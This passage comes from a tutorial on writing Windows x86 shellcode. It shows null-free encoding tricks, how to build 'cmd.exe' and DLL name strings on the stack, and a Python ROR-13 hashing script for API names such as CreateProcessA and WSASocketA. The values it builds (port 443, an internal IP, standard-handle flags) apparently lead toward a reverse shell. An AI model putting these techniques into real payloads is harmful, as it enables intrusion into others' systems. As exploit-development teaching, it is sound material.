  <text x="420" y="233" text-anchor="middle" fill="#00ff88" font-size="10">1111 1111 1111 1111 1111 1001 1111 0000</text>
  <text x="375" y="265" text-anchor="middle" fill="#e0e7ff" font-size="11">add esp, 0xFFFFF9F0 produces the same effect as sub esp, 0x610</text>
</svg></div>

### Pattern 3: NOT Encoding

```nasm
; We need 0x00000100 (STARTF_USESTDHANDLES) -- full of nulls
push  0xfffffeff            ; NOT(0x00000100) = 0xFFFFFEFF
pop   eax
not   eax                   ; EAX = 0x00000100
push  eax
```

### Pattern 4: NEG for Small Byte Values

```nasm
mov   al, 0xFA              ; 0x100 - 0x06 = 0xFA (allowed)
neg   al                    ; AL = 0x06
```

### Pattern 5: INC/DEC Chains

```nasm
xor   eax, eax              ; EAX = 0
inc   eax                   ; EAX = 1
inc   eax                   ; EAX = 2 (AF_INET)
```

### Pattern 6: Shift-Based Construction

```nasm
xor   eax, eax              ; EAX = 0x00000000
mov   al, 0xBB              ; EAX = 0x000000BB
shl   eax, 0x08             ; EAX = 0x0000BB00
inc   eax                   ; EAX = 0x0000BB01 (port 443 in NBO)
```

<div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="310" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">SHL Chain: Building Port 443 (0xBB01) Byte-by-Byte</text>
  <!-- Step 1 -->
  <text x="40" y="62" fill="#00ff88" font-size="12" font-weight="bold">Step 1: xor eax, eax</text>
  <rect x="280" y="48" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="310" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="345" y="48" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="375" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="410" y="48" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="440" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="475" y="48" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="505" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <text x="580" y="67" fill="#8b949e" font-size="10">= 0x00000000</text>
  <!-- Step 2 -->
  <text x="40" y="112" fill="#00ff88" font-size="12" font-weight="bold">Step 2: mov al, 0xBB</text>
  <rect x="280" y="98" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="310" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="345" y="98" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="375" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="410" y="98" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="440" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="475" y="98" width="60" height="28" rx="4" fill="#ff6b35" stroke-width="2"/>
  <text x="505" y="117" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">BB</text>
  <text x="580" y="117" fill="#ff6b35" font-size="10">AL = 0xBB</text>
  <!-- Shift arrow -->
  <text x="160" y="160" fill="#00d4ff" font-size="11" font-weight="bold">SHL 8: byte slides left one position</text>
  <line x1="505" y1="130" x2="440" y2="148" stroke="#00d4ff" stroke-width="2" stroke-dasharray="4,3"/>
  <polygon points="443,144 437,152 447,150" fill="#00d4ff"/>
  <!-- Step 3 -->
  <text x="40" y="192" fill="#00ff88" font-size="12" font-weight="bold">Step 3: shl eax, 0x08</text>
  <rect x="280" y="178" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="310" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="345" y="178" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="375" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="410" y="178" width="60" height="28" rx="4" fill="#ff6b35" stroke-width="2"/>
  <text x="440" y="197" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">BB</text>
  <rect x="475" y="178" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="505" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <text x="580" y="197" fill="#ff6b35" font-size="10">= 0x0000BB00</text>
  <!-- Step 4 -->
  <text x="40" y="242" fill="#00ff88" font-size="12" font-weight="bold">Step 4: inc eax</text>
  <rect x="280" y="228" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="310" y="247" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="345" y="228" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="375" y="247" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="410" y="228" width="60" height="28" rx="4" fill="#ff6b35" stroke-width="2"/>
  <text x="440" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">BB</text>
  <rect x="475" y="228" width="60" height="28" rx="4" fill="#00ff88" stroke-width="2"/>
  <text x="505" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">01</text>
  <text x="580" y="247" fill="#00ff88" font-size="10" font-weight="bold">= 0x0000BB01</text>
  <!-- Result -->
  <rect x="180" y="270" width="390" height="28" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="289" text-anchor="middle" fill="#00ff88" font-size="12">Port 443 in network byte order -- zero null bytes in opcodes</text>
</svg></div>

### Pattern 7: XOR with a Key

```nasm
mov   eax, 0x5551F890       ; Encoded value
xor   eax, 0x50505050       ; Key
; Result: 0x0501A8C0 = 192.168.1.5 in little-endian
```

<div align="center"><svg viewBox="0 0 750 400" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="400" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Null-Free Encoding Cheat Sheet</text>
  <!-- Row 1 -->
  <rect x="20" y="48" width="225" height="48" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="30" y="66" fill="#00ff88" font-size="11" font-weight="bold">1. XOR Zero</text>
  <text x="30" y="86" fill="#e0e7ff" font-size="10">mov eax,0 --> xor eax,eax</text>
  <rect x="260" y="48" width="225" height="48" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="270" y="66" fill="#00d4ff" font-size="11" font-weight="bold">2. Two's Complement</text>
  <text x="270" y="86" fill="#e0e7ff" font-size="10">sub 0x610 --> add 0xFFFFF9F0</text>
  <rect x="500" y="48" width="230" height="48" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="510" y="66" fill="#ff3366" font-size="11" font-weight="bold">3. NOT Encoding</text>
  <text x="510" y="86" fill="#e0e7ff" font-size="10">push NOT(val); pop; not</text>
  <!-- Row 2 -->
  <rect x="20" y="108" width="225" height="48" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="30" y="126" fill="#ff6b35" font-size="11" font-weight="bold">4. NEG Byte</text>
  <text x="30" y="146" fill="#e0e7ff" font-size="10">mov al,0xFA; neg al = 0x06</text>
  <rect x="260" y="108" width="225" height="48" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="270" y="126" fill="#00ff88" font-size="11" font-weight="bold">5. INC/DEC Chain</text>
  <text x="270" y="146" fill="#e0e7ff" font-size="10">xor eax,eax; inc; inc = 2</text>
  <rect x="500" y="108" width="230" height="48" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="510" y="126" fill="#00d4ff" font-size="11" font-weight="bold">6. SHL Build</text>
  <text x="510" y="146" fill="#e0e7ff" font-size="10">mov al,X; shl; mov al,Y</text>
  <!-- Row 3 centered -->
  <rect x="260" y="168" width="225" height="48" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="270" y="186" fill="#ff3366" font-size="11" font-weight="bold">7. XOR Key</text>
  <text x="270" y="206" fill="#e0e7ff" font-size="10">mov eax,encoded; xor eax,key</text>
  <!-- Concrete example -->
  <rect x="40" y="238" width="670" height="140" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="260" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">Example: Building 0x00000100 (STARTF_USESTDHANDLES)</text>
  <text x="60" y="285" fill="#8b949e" font-size="11">Need: 0x00000100</text>
  <text x="280" y="285" fill="#ff3366" font-size="11">Problem: three null bytes</text>
  <text x="60" y="310" fill="#00ff88" font-size="11">Solution (NOT): push 0xFFFFFEFF; pop eax; not eax</text>
  <text x="60" y="335" fill="#00d4ff" font-size="11">Solution (SHL): xor eax,eax; inc eax; shl eax, 8</text>
  <text x="60" y="360" fill="#e0e7ff" font-size="11">Both produce 0x00000100 with zero null bytes in the assembled opcodes</text>
</svg></div>

> These patterns are composable. A single value might require a shift, a NOT, and an INC. The more patterns you internalize, the faster you can adapt to any bad character set.

---

## 6. Building Strings on the Stack

Shellcode needs strings constantly: DLL names, command lines, file paths, registry keys. Every string must be constructed at runtime on the stack.

### The DWORD Push Pattern

Break the string into 4-byte chunks, convert each to a little-endian DWORD, and push them in reverse order. Let us build `"cmd.exe"`:

```
String:      c    m    d    .    e    x    e    \0
ASCII hex:   63   6d   64   2e   65   78   65   00
```

Group into DWORDs:

```
DWORD 1: "cmd." = 0x2e646d63
DWORD 2: "exe\0" = 0x00657865  (contains null!)
```

<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="str-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="320" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Building "cmd.exe" on the Stack</text>
  <!-- Step 1 -->
  <text x="40" y="58" fill="#00ff88" font-size="12" font-weight="bold">Step 1:</text>
  <text x="110" y="58" fill="#e0e7ff" font-size="12">xor eax, eax</text>
  <text x="350" y="58" fill="#8b949e" font-size="10">EAX = 0x00000000</text>
  <!-- Step 2 -->
  <text x="40" y="83" fill="#00ff88" font-size="12" font-weight="bold">Step 2:</text>
  <text x="110" y="83" fill="#e0e7ff" font-size="12">mov eax, 0x657865</text>
  <text x="350" y="83" fill="#8b949e" font-size="10">EAX = 0x00657865 = "exe\0" (high byte stays zero!)</text>
  <!-- Step 3 -->
  <text x="40" y="108" fill="#00ff88" font-size="12" font-weight="bold">Step 3:</text>
  <text x="110" y="108" fill="#e0e7ff" font-size="12">push eax</text>
  <text x="350" y="108" fill="#8b949e" font-size="10">Push "exe\0" onto stack</text>
  <!-- Step 4 -->
  <text x="40" y="133" fill="#00ff88" font-size="12" font-weight="bold">Step 4:</text>
  <text x="110" y="133" fill="#e0e7ff" font-size="12">push 0x2e646d63</text>
  <text x="350" y="133" fill="#8b949e" font-size="10">Push "cmd." onto stack</text>
  <!-- Stack memory layout -->
  <text x="375" y="168" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">Stack Memory (after pushes)</text>
  <!-- Memory bytes -->
  <rect x="100" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="125" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">63</text>
  <text x="125" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'c'</text>
  <rect x="155" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="180" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">6d</text>
  <text x="180" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'m'</text>
  <rect x="210" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="235" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">64</text>
  <text x="235" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'d'</text>
  <rect x="265" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="290" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">2e</text>
  <text x="290" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'.'</text>
  <rect x="320" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="345" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">65</text>
  <text x="345" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'e'</text>
  <rect x="375" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="400" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">78</text>
  <text x="400" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'x'</text>
  <rect x="430" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="455" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">65</text>
  <text x="455" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'e'</text>
  <rect x="485" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="510" y="195" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">00</text>
  <text x="510" y="212" text-anchor="middle" fill="#ff3366" font-size="9">'\0'</text>
  <!-- Labels -->
  <line x1="100" y1="225" x2="315" y2="225" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="207" y="245" text-anchor="middle" fill="#ff6b35" font-size="10">push 0x2e646d63 ("cmd.")</text>
  <line x1="320" y1="225" x2="535" y2="225" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="427" y="245" text-anchor="middle" fill="#ff6b35" font-size="10">push 0x00657865 ("exe\0")</text>
  <!-- ESP pointer -->
  <text x="60" y="198" fill="#ff3366" font-size="11">ESP--></text>
  <text x="570" y="198" fill="#8b949e" font-size="10">Higher addr --></text>
  <!-- Final -->
  <rect x="100" y="262" width="540" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="370" y="278" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">mov esi, esp</text>
  <text x="370" y="295" text-anchor="middle" fill="#e0e7ff" font-size="11">ESI now points to "cmd.exe\0" -- ready for WinExec or CreateProcessA</text>
</svg></div>

Fix with zero-extend:

```nasm
xor   eax, eax              ; EAX = 0x00000000
mov   eax, 0x657865         ; EAX = 0x00657865 (high byte stays zero)
push  eax                   ; Push "exe\0"
push  0x2e646d63            ; Push "cmd."
mov   esi, esp              ; ESI -> "cmd.exe\0"
```

### The SHL/MOV AL Trick

```nasm
xor   eax, eax              ; EAX = 0
mov   ax, 0x6c6c            ; AX = "ll"
shl   eax, 0x08             ; EAX = 0x006c6c00
mov   al, 0x64              ; AL = 'd' -> EAX = 0x006c6c64 = "dll\0"
push  eax
```

This builds `"dll\0"` byte by byte. We will see this pattern repeatedly when building DLL name strings.

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="340" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">SHL/MOV AL Trick: Building "dll\0" in EAX</text>
  <!-- Step 1 -->
  <text x="40" y="62" fill="#00ff88" font-size="12" font-weight="bold">Step 1: xor eax, eax</text>
  <rect x="300" y="48" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="324" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="353" y="48" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="377" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="406" y="48" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="430" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="459" y="48" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="483" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <text x="540" y="67" fill="#8b949e" font-size="10">EAX = 0</text>
  <!-- Step 2 -->
  <text x="40" y="112" fill="#00ff88" font-size="12" font-weight="bold">Step 2: mov ax, 0x6c6c</text>
  <rect x="300" y="98" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="324" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="353" y="98" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="377" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="406" y="98" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
  <text x="430" y="117" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
  <rect x="459" y="98" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
  <text x="483" y="117" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
  <text x="540" y="112" fill="#00d4ff" font-size="10">AX = "ll"</text>
  <!-- Shift arrow -->
  <text x="180" y="160" fill="#ff6b35" font-size="11" font-weight="bold">SHL 8: all bytes slide left, low byte zeroed</text>
  <line x1="430" y1="130" x2="377" y2="148" stroke="#ff6b35" stroke-width="2" stroke-dasharray="4,3"/>
  <polygon points="380,144 374,152 384,150" fill="#ff6b35"/>
  <!-- Step 3 -->
  <text x="40" y="192" fill="#00ff88" font-size="12" font-weight="bold">Step 3: shl eax, 0x08</text>
  <rect x="300" y="178" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="324" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="353" y="178" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
  <text x="377" y="197" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
  <rect x="406" y="178" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
  <text x="430" y="197" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
  <rect x="459" y="178" width="48" height="28" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="483" y="197" text-anchor="middle" fill="#ff3366" font-size="12">00</text>
  <text x="540" y="192" fill="#ff6b35" font-size="10">= "ll\0" gap</text>
  <!-- Step 4 -->
  <text x="40" y="242" fill="#00ff88" font-size="12" font-weight="bold">Step 4: mov al, 0x64</text>
  <rect x="300" y="228" width="48" height="28" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="324" y="247" text-anchor="middle" fill="#00ff88" font-size="11">\0</text>
  <rect x="353" y="228" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
  <text x="377" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
  <rect x="406" y="228" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
  <text x="430" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
  <rect x="459" y="228" width="48" height="28" rx="4" fill="#00ff88" stroke-width="2"/>
  <text x="483" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">64</text>
  <text x="540" y="237" fill="#00ff88" font-size="10" font-weight="bold">= "dll\0"</text>
  <text x="540" y="252" fill="#8b949e" font-size="9">0x006c6c64</text>
  <!-- Character labels underneath -->
  <text x="324" y="275" text-anchor="middle" fill="#8b949e" font-size="10">'\0'</text>
  <text x="377" y="275" text-anchor="middle" fill="#e0e7ff" font-size="10">'l'</text>
  <text x="430" y="275" text-anchor="middle" fill="#e0e7ff" font-size="10">'l'</text>
  <text x="483" y="275" text-anchor="middle" fill="#e0e7ff" font-size="10">'d'</text>
  <!-- Result box -->
  <rect x="140" y="295" width="470" height="30" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="315" text-anchor="middle" fill="#00ff88" font-size="12">push eax puts "dll\0" on the stack in little-endian order: 64 6c 6c 00</text>
</svg></div>

---

## 7. The ROR-13 Hash Generator

Our `find_function` engine identifies Windows API functions by comparing 32-bit hashes. Here is the Python utility that produces them.

### Python Implementation

```python
import sys

def ror13_hash(name):
    """Compute the ROR-13 hash of a function name."""
    h = 0
    for ch in name:
        h = ((h >> 13) | (h << (32 - 13))) & 0xFFFFFFFF
        h = (h + ord(ch)) & 0xFFFFFFFF
    return h

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python hash.py FunctionName [FunctionName ...]")
        sys.exit(1)

    for name in sys.argv[1:]:
        h = ror13_hash(name)
        print(f"  {name:30s} -> 0x{h:08x}")
```

Running it:

```
$ python hash.py LoadLibraryA CreateProcessA ExitProcess WSAStartup WSASocketA connect
  LoadLibraryA                   -> 0xec0e4e8e
  CreateProcessA                 -> 0x16b3fe72
  ExitProcess                    -> 0x73e2d87e
  WSAStartup                     -> 0x3bfcedcb
  WSASocketA                     -> 0xadf509d9
  connect                        -> 0x60aaf9ec
```

These are the exact values we embed as immediates in our shellcode.

<div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="310" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">ROR-13 Hash: Processing "L" (first char of LoadLibraryA)</text>
  <!-- Initial state -->
  <text x="40" y="58" fill="#ff6b35" font-size="12" font-weight="bold">Initial EDX:</text>
  <text x="170" y="58" fill="#e0e7ff" font-size="12">0x00000000</text>
  <!-- Bit representation before -->
  <text x="40" y="85" fill="#00d4ff" font-size="11" font-weight="bold">Before ROR 13:</text>
  <rect x="180" y="70" width="540" height="26" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="450" y="88" text-anchor="middle" fill="#e0e7ff" font-size="10">00000000 00000000 00000000 00000000</text>
  <!-- ROR operation -->
  <text x="375" y="115" text-anchor="middle" fill="#00ff88" font-size="12">ror edx, 13  (rotate right 13 bits -- no change when zero)</text>
  <!-- Add character -->
  <text x="40" y="145" fill="#00ff88" font-size="11" font-weight="bold">Add 'L' (0x4C):</text>
  <text x="200" y="145" fill="#e0e7ff" font-size="11">EDX = 0x00000000 + 0x4C = 0x0000004C</text>
  <!-- Result bits -->
  <rect x="180" y="155" width="540" height="26" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="450" y="173" text-anchor="middle" fill="#00ff88" font-size="10">00000000 00000000 00000000 01001100</text>
  <!-- Second iteration -->
  <rect x="30" y="195" width="690" height="95" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="215" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">Next iteration: char 'o' (0x6F)</text>
  <text x="50" y="240" fill="#e0e7ff" font-size="11">ROR 13:  0x0000004C >> 13 | 0x0000004C &lt;&lt; 19 = 0x00260000</text>
  <text x="50" y="260" fill="#00ff88" font-size="11">Add 'o': 0x00260000 + 0x6F = 0x0026006F</text>
  <text x="50" y="280" fill="#8b949e" font-size="10">Each character rotates the accumulator right 13 bits, then adds the ASCII value</text>
</svg></div>

> **Important:** The hash algorithm in your shellcode and in your Python script must be identical. If you split the rotation for bad character avoidance (e.g., `ror edx, 7` + `ror edx, 6` instead of `ror edx, 13`), the total rotation is still 13, so the hashes remain the same.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="280" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">ROR-13 Hash Pipeline: From API Name to Shellcode</text>
  <!-- Step 1: Function name -->
  <rect x="30" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="120" y="76" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">API Function Name</text>
  <text x="120" y="96" text-anchor="middle" fill="#e0e7ff" font-size="11">"LoadLibraryA"</text>
  <!-- Arrow 1 -->
  <line x1="215" y1="82" x2="253" y2="82" stroke="#00ff88" stroke-width="2"/>
  <polygon points="250,76 260,82 250,88" fill="#00ff88"/>
  <!-- Step 2: Hash script -->
  <rect x="265" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="355" y="76" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">Python hash.py</text>
  <text x="355" y="96" text-anchor="middle" fill="#e0e7ff" font-size="11">ROR-13 each char</text>
  <!-- Arrow 2 -->
  <line x1="450" y1="82" x2="488" y2="82" stroke="#00ff88" stroke-width="2"/>
  <polygon points="485,76 495,82 485,88" fill="#00ff88"/>
  <!-- Step 3: Hash value -->
  <rect x="500" y="55" width="220" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="610" y="76" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">32-bit Hash</text>
  <text x="610" y="96" text-anchor="middle" fill="#00ff88" font-size="13">0xec0e4e8e</text>
  <!-- Arrow down -->
  <line x1="610" y1="115" x2="610" y2="145" stroke="#00ff88" stroke-width="2"/>
  <polygon points="604,142 610,152 616,142" fill="#00ff88"/>
  <!-- Step 4: Embedded in ASM -->
  <rect x="120" y="155" width="510" height="60" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="375" y="178" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Embedded in Shellcode Assembly</text>
  <text x="375" y="200" text-anchor="middle" fill="#e0e7ff" font-size="12">push 0xec0e4e8e    ; LoadLibraryA hash</text>
  <!-- Arrow down -->
  <line x1="375" y1="220" x2="375" y2="240" stroke="#00ff88" stroke-width="2"/>
  <polygon points="369,237 375,247 381,237" fill="#00ff88"/>
  <!-- Step 5: Resolution at runtime -->
  <rect x="200" y="248" width="350" height="25" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="266" text-anchor="middle" fill="#00d4ff" font-size="11">call find_function --> EAX = address of LoadLibraryA</text>
</svg></div>

---

## 8. Testing Shellcode: Keystone and ctypes

Before we write real payloads, we need a fast development loop. Three tools make this possible: **Keystone** (assembler), a **bad character scanner**, and **ctypes** (executor).

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="dev-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
    <marker id="dev-r" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff3366"/></marker>
  </defs>
  <rect width="750" height="300" rx="10" fill="#0a0e17"/>
  <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Shellcode Development Pipeline</text>
  <!-- Step 1: Write -->
  <rect x="30" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="90" y="85" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">1. Write</text>
  <text x="90" y="102" text-anchor="middle" fill="#e0e7ff" font-size="10">NASM Assembly</text>
  <line x1="150" y1="90" x2="185" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <!-- Step 2: Assemble -->
  <rect x="190" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="250" y="85" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">2. Assemble</text>
  <text x="250" y="102" text-anchor="middle" fill="#e0e7ff" font-size="10">Keystone</text>
  <line x1="310" y1="90" x2="345" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <!-- Step 3: Scan -->
  <rect x="350" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="410" y="85" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">3. Scan</text>
  <text x="410" y="102" text-anchor="middle" fill="#e0e7ff" font-size="10">Bad Chars?</text>
  <line x1="470" y1="90" x2="505" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <!-- Step 4: Execute -->
  <rect x="510" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="570" y="85" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">4. Execute</text>
  <text x="570" y="102" text-anchor="middle" fill="#e0e7ff" font-size="10">ctypes</text>
